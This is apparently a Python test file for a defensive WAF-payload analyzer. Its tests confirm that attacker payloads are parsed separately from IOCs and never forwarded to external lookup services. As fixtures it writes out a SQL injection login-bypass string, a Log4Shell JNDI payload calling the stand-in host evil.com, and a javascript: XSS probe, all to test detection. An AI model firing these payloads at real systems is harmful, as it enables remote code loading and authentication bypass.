"""Integration tests for the WAF Payload field and its pipeline routing.

WAF payloads used to arrive through the *same* textarea as every other IOC
(docs/waf_payload_analyzer.md D5/D6), which meant a payload landed inside
``parsed_input_items`` by construction and had to be partitioned back out
before ``summarize_results`` and provider dispatch ever saw it — the
highest-risk step the module shipped with.

They now arrive through a dedicated Context field (``WAF Payload``, alongside
Command Line), parsed by :func:`core.waf_payload_parser.parse_waf_field` and
analysed independently of :func:`ioc.parser.parse_iocs`. That removes the
risk at its root: a payload can no longer reach ``parsed_input_items`` at
all, so it cannot reach ``summarize_results`` or provider dispatch by any
path. The two claims below are still worth asserting against the real code
rather than taken on trust:

1. a WAF payload never reaches :func:`ioc.verdict.summarize_results`;
2. the WAF payload list is never passed into provider dispatch, so no lookup
   can fire for it — an attacker-supplied payload must never be forwarded to
   an external service.
"""
from __future__ import annotations

import unittest

import dataclasses

from core.waf_payload_analyzer import analyze_waf_payload, to_rows
from core.waf_payload_parser import parse_waf_field
from ioc.parser import parse_iocs
from ioc.verdict import summarize_results

SQLI_LINE = "/login?user= | ' OR '1'='1"
LOG4SHELL_LINE = "/api/data | ${jndi:ldap://evil.com/a}"


class TestIocBoxNoLongerDetectsWaf(unittest.TestCase):
    """The IOC textarea's type cascade dropped the WAF branch entirely."""

    def test_delimited_lines_are_no_longer_typed_as_waf_payload(self) -> None:
        # Neither line matches any of the remaining six detectors, so both
        # are silently dropped — the same fate any unrecognised line gets.
        for line in (SQLI_LINE, LOG4SHELL_LINE):
            with self.subTest(line=line):
                self.assertEqual(parse_iocs(line), [])

    def test_existing_types_are_unaffected(self) -> None:
        raw = "\n".join([
            "8.8.8.8",
            "example.com",
            "http://evil.test/a",
            "44d88612fea8a8f36de82e1278abb02f",
            "user@example.com",
            "acmecorp",
        ])
        types = [i.type for i in parse_iocs(raw)]
        self.assertEqual(types, ["ip", "domain", "url", "hash", "email", "whois"])

    def test_ioc_dataclass_carries_no_waf_field(self) -> None:
        # The split used to ride alongside the IOC (``IOC.waf``). That field
        # is gone now that the split never happens on this path.
        item = parse_iocs("8.8.8.8")[0]
        self.assertFalse(hasattr(item, "waf"))

    def test_mixed_batch_only_sees_real_iocs(self) -> None:
        raw = "\n".join(["8.8.8.8", SQLI_LINE, "example.com"])
        items = parse_iocs(raw)
        self.assertEqual([i.type for i in items], ["ip", "domain"])


class TestWafField(unittest.TestCase):
    """The dedicated field lifts both restrictions D5 imposed on the IOC box."""

    def test_payload_only_line_is_accepted(self) -> None:
        # D5's payload-only fallback was deferred in the shared textarea
        # because SCHEMELESS_URL_RE already claims host-plus-path lines. A
        # dedicated field has no such contest.
        parsed = parse_waf_field("' OR '1'='1")
        self.assertEqual(len(parsed), 1)
        self.assertIsNone(parsed[0].path)
        self.assertEqual(parsed[0].payload, "' OR '1'='1")

    def test_delimited_line_still_splits_path_and_payload(self) -> None:
        parsed = parse_waf_field(SQLI_LINE)
        self.assertEqual(len(parsed), 1)
        self.assertEqual(parsed[0].path, "/login?user=")
        self.assertEqual(parsed[0].payload, "' OR '1'='1")

    def test_multiple_lines_each_become_one_entry(self) -> None:
        text = "\n".join([SQLI_LINE, LOG4SHELL_LINE, "javascript:alert(1)"])
        parsed = parse_waf_field(text)
        self.assertEqual(len(parsed), 3)
        self.assertEqual(parsed[2].payload, "javascript:alert(1)")

    def test_blank_lines_are_skipped(self) -> None:
        parsed = parse_waf_field(f"\n{SQLI_LINE}\n\n\n{LOG4SHELL_LINE}\n")
        self.assertEqual(len(parsed), 2)

    def test_empty_field_yields_no_entries(self) -> None:
        self.assertEqual(parse_waf_field(""), [])
        self.assertEqual(parse_waf_field("   \n  \n"), [])

    def test_marker_gate_does_not_drop_a_line(self) -> None:
        # In the shared textarea a payload tripping no marker is refused
        # (D5) so a stray pipe in an unrelated line isn't misread as an
        # attack. That contest doesn't exist here — the analyst chose this
        # box — so a benign-looking line is analysed anyway.
        parsed = parse_waf_field("hello world")
        self.assertEqual(len(parsed), 1)
        self.assertEqual(parsed[0].markers, [])

    def test_trailing_delimiter_with_no_payload_is_kept(self) -> None:
        parsed = parse_waf_field("/login?user= |")
        self.assertEqual(len(parsed), 1)
        self.assertEqual(parsed[0].path, "/login?user=")
        self.assertEqual(parsed[0].payload, "")


class TestPipelineRouting(unittest.TestCase):
    """The WAF field's results never enter the IOC pipeline."""

    def test_summarize_results_never_sees_a_payload(self) -> None:
        items = parse_iocs("8.8.8.8")
        waf_items = parse_waf_field(SQLI_LINE)
        self.assertEqual(len(waf_items), 1)

        summary, rows = summarize_results(items, {}, {}, {}, {}, {})

        # One row and one count for the IP, nothing for the payload —
        # ``items`` was never given anything from the WAF field to begin
        # with, so there is no partition left to get wrong.
        self.assertEqual(summary["total"], 1)
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["Artifact"], "8.8.8.8")

    def test_a_payload_only_run_produces_no_ioc_rows(self) -> None:
        items = parse_iocs("")
        waf_items = parse_waf_field("\n".join([SQLI_LINE, LOG4SHELL_LINE]))
        self.assertEqual(len(waf_items), 2)
        self.assertEqual(items, [])

        summary, rows = summarize_results(items, {}, {}, {}, {}, {})
        self.assertEqual(summary["total"], 0)
        self.assertEqual(rows, [])


class TestEndToEnd(unittest.TestCase):
    """The full app.py path: parse the two fields, analyse, render."""

    IOC_RAW = "\n".join(["8.8.8.8", "example.com"])
    WAF_RAW = "\n".join([
        "/login?user= | id=1%27 OR 1=1",
        "/api/data | ${jndi:ldap://evil.com/a}",
    ])

    def _run(self) -> tuple[dict, list, list]:
        """Mirror app.py's enrichment block, minus the provider calls."""
        items = parse_iocs(self.IOC_RAW)
        waf_items = parse_waf_field(self.WAF_RAW)
        waf_results = [analyze_waf_payload(w) for w in waf_items]
        summary, rows = summarize_results(items, {}, {}, {}, {}, {})
        waf_rows = [row for r in waf_results for row in to_rows(r)]
        return summary, rows, waf_rows

    def test_the_two_fields_produce_independent_streams(self) -> None:
        summary, rows, waf_rows = self._run()
        self.assertEqual(summary["total"], 2)
        self.assertEqual([r["Artifact"] for r in rows], ["8.8.8.8", "example.com"])
        self.assertEqual(len(waf_rows), 2)

    def test_concatenated_table_has_no_ragged_columns(self) -> None:
        # What the renderer actually does. A key present in one stream and
        # absent in the other breaks the Table render for the whole run.
        _, rows, waf_rows = self._run()
        keys = {frozenset(r.keys()) for r in rows + waf_rows}
        self.assertEqual(len(keys), 1, "row schemas diverged between streams")

    def test_result_survives_asdict_for_the_json_output(self) -> None:
        parsed = parse_waf_field("/login?user= | id=1%27 OR 1=1")
        result = analyze_waf_payload(parsed[0])
        blob = dataclasses.asdict(result)
        self.assertEqual(blob["path"], "/login?user=")
        self.assertIn("1' OR 1=1", blob["decoded_payload"])
        self.assertIn("crs_anomaly_score_pl12", blob)
        self.assertIn("cve_fingerprint_match", blob)

    def test_payload_only_field_still_produces_rows(self) -> None:
        parsed = parse_waf_field("${jndi:ldap://evil.com/a}")
        results = [analyze_waf_payload(w) for w in parsed]
        rows = [row for r in results for row in to_rows(r)]
        self.assertEqual(len(rows), 1)
        # Log4Shell trips its curated CVE fingerprint, the module's only
        # single-source Malicious (D10) — unaffected by where the line came
        # from, since the analyzer never sees the source field.
        self.assertEqual(rows[0]["Verdict"], "Malicious")


class TestProviderIsolation(unittest.TestCase):
    """The claim that a payload can never be sent to an external service."""

    def test_type_is_absent_from_the_provider_group_map(self) -> None:
        # app.py cannot be imported under test (it executes Streamlit calls at
        # module scope), so the map is read from source. Crude, but it pins the
        # invariant that actually matters, and fails loudly if someone adds a
        # group for this type without revisiting D6.
        from pathlib import Path

        source = Path(__file__).resolve().parents[1] / "app.py"
        text = source.read_text(encoding="utf-8")
        start = text.index("_IOC_TYPE_TO_GROUP")
        block = text[start:text.index("}", start)]
        self.assertNotIn("waf_payload", block)

    def test_waf_field_is_parsed_before_provider_dispatch(self) -> None:
        # Ordering still matters for readability even though the WAF list can
        # no longer leak into ``items``: the field should be resolved ahead
        # of the provider_flags computation in the enrichment block.
        from pathlib import Path

        text = (Path(__file__).resolve().parents[1] / "app.py").read_text(encoding="utf-8")
        parse_at = text.index("_waf_items = parse_waf_field(")
        dispatch_at = text.index("provider_flags = {p: bool(_payload(p))")
        self.assertLess(parse_at, dispatch_at)


if __name__ == "__main__":
    unittest.main()
